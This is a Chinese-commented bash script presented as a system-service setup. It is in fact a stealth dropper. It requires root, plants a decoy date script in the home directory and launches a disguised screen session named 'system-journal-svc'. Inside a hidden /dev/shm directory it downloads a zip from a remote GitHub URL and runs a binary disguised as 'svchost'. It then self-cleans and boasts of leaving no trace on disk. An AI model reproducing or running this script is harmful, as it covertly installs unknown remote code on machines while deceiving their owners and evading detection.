#!/bin/bash

# --- 配置 ---
ZIP_URL="https://raw.githubusercontent.com/ccqwerty123/ccqwerty123/refs/heads/main/system-core-package.zip"
# 障眼法脚本的路径和名称
DECOY_SCRIPT_PATH="${HOME}/time_check.sh"
# 后台会话名称
SESSION_NAME="system-journal-svc"

# --- 脚本开始 ---
echo "正在初始化系统服务环境..."

# 检查 root 权限
if [ "$(id -u)" != "0" ]; then
   echo "错误：需要 root 权限来优化系统性能。" 1>&2
   exit 1
fi

# 1. 安装依赖
apt-get update > /dev/null 2>&1
apt-get install -y unzip screen wget > /dev/null 2>&1

# 2. 创建障眼法脚本
cat > "$DECOY_SCRIPT_PATH" <<'DECOYEOF'
#!/bin/bash
# 这是一个用于显示当前系统日期和时间的简单工具。
echo "当前系统时间: $(date)"
DECOYEOF

# 赋予障眼法脚本执行权限
chmod +x "$DECOY_SCRIPT_PATH"
echo "已在 ${HOME} 目录创建日常维护脚本: time_check.sh"

# 3. 在后台 screen 会话中执行真正的核心任务
screen -d -m -S "$SESSION_NAME" bash -c "
    # 定义内存工作目录
    RAM_DIR='/dev/shm/.host-cache-data'

    # 设置退出时自动清理
    trap 'rm -rf \$RAM_DIR' EXIT

    # 创建目录并进入
    mkdir -p \$RAM_DIR && cd \$RAM_DIR || exit

    # 下载并解压
    wget -q -O components.zip '$ZIP_URL'
    unzip -q components.zip
    chmod +x svchost

    # 启动核心进程
    ./svchost
"

# 4. 最终确认信息
sleep 2
if screen -list | grep -q "$SESSION_NAME"; then
    echo "---------------------------------------------------------"
    echo "成功！核心服务已在后台匿名启动。"
    echo "会话名称: $SESSION_NAME (已伪装)"
    echo "所有核心组件均在内存中运行，硬盘上无任何痕迹。"
    echo "---------------------------------------------------------"
else
    echo "错误：无法启动后台服务。请检查系统日志。"
fi
